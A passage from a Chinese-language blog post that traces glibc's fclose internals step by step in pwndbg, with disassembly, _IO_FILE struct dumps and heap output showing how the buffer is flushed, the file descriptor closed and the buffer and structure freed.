&lt;_IO_file_write+20&gt;  ✘ jle    _IO_file_write+152          &lt;_IO_file_write+152&gt;</span><br></pre></td></tr></table></figure><p>为0则直接返回，往下走<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8aeda &lt;_IO_file_write+26&gt;    mov    rbp, rsi     RBP =&gt; 0x5555555594b0 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br><span class="line">0x7ffff7c8aedd &lt;_IO_file_write+29&gt;    mov    r12, rdx     R12 =&gt; 0x20</span><br><span class="line">0x7ffff7c8aee3 &lt;_IO_file_write+35&gt;:   jmp    0x7ffff7c8aefd &lt;_IO_new_file_write+61&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8aefd &lt;_IO_file_write+61&gt;    mov    edi, dword ptr [r13 + 0x70]     EDI, [0x555555559310] =&gt; 3</span><br><span class="line">0x7ffff7c8af01 &lt;_IO_file_write+65&gt;    mov    rdx, rbx                        RDX =&gt; 0x20</span><br><span class="line">0x7ffff7c8af04 &lt;_IO_file_write+68&gt;    mov    rsi, rbp                        RSI =&gt; 0x5555555594b0 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br><span class="line">0x7ffff7c8af07 &lt;_IO_file_write+71&gt;    test   byte ptr [r13 + 0x74], 2        0 &amp; 2     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8af0c &lt;_IO_file_write+76&gt;  ✔ je     _IO_file_write+40           &lt;_IO_file_write+40&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8aee8 &lt;_IO_file_write+40&gt;    call   write                       &lt;write&gt;</span><br></pre></td></tr></table></figure><p>后续就是系统调用<code>write</code>来将输出缓冲区的数据输出到目标文件<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7d14870 &lt;write&gt;       endbr64</span><br><span class="line">0x7ffff7d14874 &lt;write+4&gt;     mov    eax, dword ptr fs:[0x18]     EAX, [0x7ffff7fb1758] =&gt; 0</span><br><span class="line">0x7ffff7d1487c &lt;write+12&gt;    test   eax, eax                     0 &amp; 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7d1487e &lt;write+14&gt;  ✘ jne    write+32                    &lt;write+32&gt;</span><br><span class="line"></span><br><span class="line">0x7ffff7d14880 &lt;write+16&gt;    mov    eax, 1            EAX =&gt; 1</span><br><span class="line">0x7ffff7d14885 &lt;write+21&gt;    syscall  &lt;SYS_write&gt;</span><br></pre></td></tr></table></figure><p>后续回到<code>_IO_do_write</code><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8c9f5 &lt;_IO_do_write+197&gt;    mov    rax, qword ptr [rbx + 0x38]     RAX, [0x5555555592d8] =&gt; 0x5555555594b0 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br><span class="line">0x7ffff7c8c9f9 &lt;_IO_do_write+201&gt;    mov    edx, dword ptr [rbx + 0xc0]     EDX, [0x555555559360] =&gt; 0xffffffff</span><br><span class="line">0x7ffff7c8c9ff &lt;_IO_do_write+207&gt;    movq   xmm0, rax                       XMM0 =&gt; 0x5555555594b0 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br><span class="line">0x7ffff7c8ca04 &lt;_IO_do_write+212&gt;    mov    qword ptr [rbx + 0x28], rax     [0x5555555592c8] &lt;= 0x5555555594b0 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br><span class="line">0x7ffff7c8ca08 &lt;_IO_do_write+216&gt;    punpcklqdq xmm0, xmm0</span><br><span class="line">0x7ffff7c8ca0c &lt;_IO_do_write+220&gt;    movups xmmword ptr [rbx + 8], xmm0</span><br><span class="line">0x7ffff7c8ca10 &lt;_IO_do_write+224&gt;    movups xmmword ptr [rbx + 0x18], xmm0</span><br><span class="line">0x7ffff7c8ca14 &lt;_IO_do_write+228&gt;    test   edx, edx                           0xffffffff &amp; 0xffffffff     EFLAGS =&gt; 0x286 [ cf PF af zf SF IF df of ac ]</span><br><span class="line">0x7ffff7c8ca16 &lt;_IO_do_write+230&gt;  ✔ jle    _IO_do_write+288            &lt;_IO_do_write+288&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8ca50 &lt;_IO_do_write+288&gt;    test   dword ptr [rbx], 0x202             0xfbad2c04 &amp; 0x202     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8ca56 &lt;_IO_do_write+294&gt;  ✘ jne    _IO_do_write+236            &lt;_IO_do_write+236&gt;</span><br></pre></td></tr></table></figure><p>看到刷新了write指针<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$7 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537084,</span><br><span class="line">    _IO_read_ptr = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_read_end = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_read_base = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_write_base = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_write_ptr = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_write_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_buf_base = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_buf_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再往后<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8bece &lt;_IO_file_close_it+62&gt;    mov    r12, qword ptr [rbx + 0xd8]     R12, [0x555555559378] =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8bed5 &lt;_IO_file_close_it+69&gt;    lea    rdx, [rip + 0x18ab24]           RDX =&gt; 0x7ffff7e16a00 (_IO_helper_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8bedc &lt;_IO_file_close_it+76&gt;    lea    rax, [rip + 0x18b885]           RAX =&gt; 0x7ffff7e17768 ◂— 0</span><br><span class="line">0x7ffff7c8bee3 &lt;_IO_file_close_it+83&gt;    sub    rax, rdx                        RAX =&gt; 0xd68 (0x7ffff7e17768 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c8bee6 &lt;_IO_file_close_it+86&gt;    mov    rcx, r12                        RCX =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8bee9 &lt;_IO_file_close_it+89&gt;    sub    rcx, rdx                        RCX =&gt; 0xc00 (0x7ffff7e17600 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c8beec &lt;_IO_file_close_it+92&gt;    cmp    rax, rcx                        0xd68 - 0xc00     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x00007ffff7c8beef &lt;+95&gt;:    jbe    0x7ffff7c8bfe0 &lt;_IO_new_file_close_it+336&gt;</span><br></pre></td></tr></table></figure><p>仍然是<code>vtable</code>的安全检查机制，<code>&lt;_IO_new_file_close_it+336&gt;</code>处就是<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7c8bfe0 &lt;+336&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br></pre></td></tr></table></figure><p>不再赘述，后续调用<code>vtable-&gt;_IO_file_close</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8bef5 &lt;_IO_file_close_it+101&gt;    mov    rdi, rbx     RDI =&gt; 0x5555555592a0 ◂— 0xfbad2c04</span><br><span class="line">0x7ffff7c8bef8 &lt;_IO_file_close_it+104&gt;    call   qword ptr [r12 + 0x88]      &lt;_IO_file_close&gt;</span><br></pre></td></tr></table></figure><p>调用<code>__close_nocancel</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8a590 &lt;_IO_file_close&gt;         endbr64</span><br><span class="line">0x7ffff7c8a594 &lt;_IO_file_close+4&gt;       mov    edi, dword ptr [rdi + 0x70]     EDI, [0x555555559310] =&gt; 3</span><br><span class="line">0x7ffff7c8a597 &lt;_IO_file_close+7&gt;       jmp    __close_nocancel            &lt;__close_nocancel&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7d19860 &lt;__close_nocancel&gt;       endbr64</span><br><span class="line">0x7ffff7d19864 &lt;__close_nocancel+4&gt;     mov    eax, 3            EAX =&gt; 3</span><br><span class="line">0x7ffff7d19869 &lt;__close_nocancel+9&gt;     syscall  &lt;SYS_close&gt;</span><br></pre></td></tr></table></figure><p>而<code>__close_nocancel</code>直接系统调用<code>close</code>函数来关闭文件描述符<br>后续回到<code>_IO_file_close_it</code>，调用<code>_IO_setb</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8bf47 &lt;_IO_file_close_it+183&gt;    xor    ecx, ecx     ECX =&gt; 0</span><br><span class="line">0x7ffff7c8bf49 &lt;_IO_file_close_it+185&gt;    xor    edx, edx     EDX =&gt; 0</span><br><span class="line">0x7ffff7c8bf4b &lt;_IO_file_close_it+187&gt;    xor    esi, esi     ESI =&gt; 0</span><br><span class="line">0x7ffff7c8bf4d &lt;_IO_file_close_it+189&gt;    mov    rdi, rbx     RDI =&gt; 0x5555555592a0 ◂— 0xfbad2c04</span><br><span class="line">0x7ffff7c8bf50 &lt;_IO_file_close_it+192&gt;    call   _IO_setb                    &lt;_IO_setb&gt;</span><br></pre></td></tr></table></figure><p>这里<code>_IO_setb</code>还调用<code>free</code>函数释放了缓冲区<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8dc74 &lt;_IO_setb+84&gt;    call   free@plt                    &lt;free@plt&gt;</span><br><span class="line">        ptr: 0x5555555594b0 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br></pre></td></tr></table></figure><p><code>_IO_setb</code>结束后可以看到<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$10 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537083,</span><br><span class="line">    _IO_read_ptr = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_read_end = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_read_base = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_write_base = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_write_ptr = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_write_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_buf_base</code>,<code>_IO_buf_end</code>都已经清空<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x1e0 (with flag bits: 0x1e1)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559470</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555594a0</span><br><span class="line">Size: 0x20b60 (with flag bits: 0x20b61)</span><br></pre></td></tr></table></figure><p>对应的缓冲区chunk也被释放（这里被<code>topchunk</code>合并）<br>然后刷新读写指针<br>将指针全部清空了（<code>xmmword</code>是16字节单元）<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8bf55 &lt;_IO_file_close_it+197&gt;    pxor   xmm0, xmm0</span><br><span class="line">0x7ffff7c8bf59 &lt;_IO_file_close_it+201&gt;    mov    rdi, rbx                           RDI =&gt; 0x5555555592a0 ◂— 0xfbad2c05</span><br><span class="line">0x7ffff7c8bf5c &lt;_IO_file_close_it+204&gt;    movups xmmword ptr [rbx + 8], xmm0</span><br><span class="line">0x7ffff7c8bf60 &lt;_IO_file_close_it+208&gt;    movups xmmword ptr [rbx + 0x18], xmm0</span><br><span class="line">0x7ffff7c8bf64 &lt;_IO_file_close_it+212&gt;    movups xmmword ptr [rbx + 0x28], xmm0</span><br></pre></td></tr></table></figure><p>后续再次调用<code>_IO_un_link</code>确保从<code>_IO_list_all</code>中脱离<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8bf68 &lt;_IO_file_close_it+216&gt;    call   _IO_un_link                 &lt;_IO_un_link&gt;</span><br><span class="line">        rdi: 0x5555555592a0 ◂— 0xfbad2c05</span><br></pre></td></tr></table></figure><p>再往下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8bf6d &lt;_IO_file_close_it+221&gt;    test   r12d, r12d                                     0 &amp; 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8bf70 &lt;_IO_file_close_it+224&gt;    mov    dword ptr [rbx], 0xfbad240c                    [0x5555555592a0] &lt;= 0xfbad240c</span><br><span class="line">0x7ffff7c8bf76 &lt;_IO_file_close_it+230&gt;    mov    dword ptr [rbx + 0x70], 0xffffffff             [0x555555559310] &lt;= 0xffffffff</span><br><span class="line">0x7ffff7c8bf7d &lt;_IO_file_close_it+237&gt;  ✔ cmove  r12d, ebp</span><br><span class="line">0x7ffff7c8bf81 &lt;_IO_file_close_it+241&gt;    mov    qword ptr [rbx + 0x90], 0xffffffffffffffff     [0x555555559330] &lt;= 0xffffffffffffffff</span><br></pre></td></tr></table></figure><p>设置<code>_flags</code>,<code>_fileno</code>和<code>_offset</code>域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$11 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539124,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = -1,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到指针全部清空，<code> _offset</code>和<code>_fileno</code>都被设置为-1<br>最后回到<code>_IO_new_fclose</code>函数，再对<code>vtable</code>安全检查后，调用<code>vtable-&gt;_IO_file_finish</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7ecd9 &lt;fclose+105&gt;    xor    esi, esi     ESI =&gt; 0</span><br><span class="line">0x7ffff7c7ecdb &lt;fclose+107&gt;    mov    rdi, rbp     RDI =&gt; 0x5555555592a0 ◂— 0xfbad240c</span><br><span class="line">0x7ffff7c7ecde &lt;fclose+110&gt;    call   qword ptr [rbx + 0x10]      &lt;_IO_file_finish&gt;</span><br></pre></td></tr></table></figure><p>函数首先检查了文件描述符是否打开，其已经被设置为-1，所以不会进入该流程。如果文件打开的话则会调用<code>_IO_do_flush</code>和<code>_IO_SYSCLOSE</code>刷新缓冲区以及关闭文件。<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8bffd &lt;_IO_file_finish+13&gt;     cmp    dword ptr [rdi + 0x70], -1     0xffffffff - -0x1     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8c001 &lt;_IO_file_finish+17&gt;   ✔ je     _IO_file_finish+106         &lt;_IO_file_finish+106&gt;</span><br></pre></td></tr></table></figure><p>接着调用<code>_IO_default_finish</code>确认缓冲区确实被释放，以及结构体从<code>_IO_list_all</code>中取了下来，并设置指针<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8c05a &lt;_IO_file_finish+106&gt;    add    rsp, 8       RSP =&gt; 0x7fffffffdc48 (0x7fffffffdc40 + 0x8)</span><br><span class="line">0x7ffff7c8c05e &lt;_IO_file_finish+110&gt;    mov    rdi, rbp     RDI =&gt; 0x5555555592a0 ◂— 0xfbad240c</span><br><span class="line">0x7ffff7c8c061 &lt;_IO_file_finish+113&gt;    xor    esi, esi     ESI =&gt; 0</span><br><span class="line">0x7ffff7c8c063 &lt;_IO_file_finish+115&gt;    pop    rbx          RBX =&gt; 0x7ffff7e17600 (_IO_file_jumps)</span><br><span class="line">0x7ffff7c8c064 &lt;_IO_file_finish+116&gt;    pop    rbp          RBP =&gt; 0x5555555592a0</span><br><span class="line">0x7ffff7c8c065 &lt;_IO_file_finish+117&gt;    jmp    _IO_default_finish          &lt;_IO_default_finish&gt;</span><br></pre></td></tr></table></figure><p>可以看到判断<code>[rdi + 0x38]</code>也就是<code>_IO_buf_base</code>是否为0，确认缓冲区确实被释放<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8e734 &lt;_IO_default_finish+4&gt;     push   rbp</span><br><span class="line">0x7ffff7c8e735 &lt;_IO_default_finish+5&gt;     mov    rbp, rdi                        RBP =&gt; 0x5555555592a0 ◂— 0xfbad240c</span><br><span class="line">0x7ffff7c8e738 &lt;_IO_default_finish+8&gt;     mov    rdi, qword ptr [rdi + 0x38]     RDI, [0x5555555592d8] =&gt; 0</span><br><span class="line">0x7ffff7c8e73c &lt;_IO_default_finish+12&gt;    test   rdi, rdi                        0 &amp; 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8e73f &lt;_IO_default_finish+15&gt;  ✔ je     _IO_default_finish+23       &lt;_IO_default_finish+23&gt;</span><br></pre></td></tr></table></figure><p>接着又检查了很多域<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8e747 &lt;_IO_default_finish+23&gt;    mov    rax, qword ptr [rbp + 0x60]     RAX, [0x555555559300] =&gt; 0</span><br><span class="line">0x7ffff7c8e74b &lt;_IO_default_finish+27&gt;    test   rax, rax                        0 &amp; 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8e74e &lt;_IO_default_finish+30&gt;  ✔ je     _IO_default_finish+48       &lt;_IO_default_finish+48&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8e760 &lt;_IO_default_finish+48&gt;    mov    rdi, qword ptr [rbp + 0x48]     RDI, [0x5555555592e8] =&gt; 0</span><br><span class="line">0x7ffff7c8e764 &lt;_IO_default_finish+52&gt;    test   rdi, rdi                        0 &amp; 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8e767 &lt;_IO_default_finish+55&gt;  ✔ je     _IO_default_finish+70       &lt;_IO_default_finish+70&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8e776 &lt;_IO_default_finish+70&gt;    test   byte ptr [rbp], 0x80            0xc &amp; 0x80     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8e77a &lt;_IO_default_finish+74&gt;  ✘ jne    _IO_default_finish+96       &lt;_IO_default_finish+96&gt;</span><br></pre></td></tr></table></figure><p>检查完后回到<code>_IO_new_fclose</code>，再经过一下检查判断后调用<code>free</code>来释放结构体的chunk<br><code>free</code>完后<code>fclose</code>函数全部结束<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7ed1f &lt;fclose+175&gt;    mov    rdi, rbp     RDI =&gt; 0x5555555592a0 ◂— 0xfbad240c</span><br><span class="line">0x7ffff7c7ed22 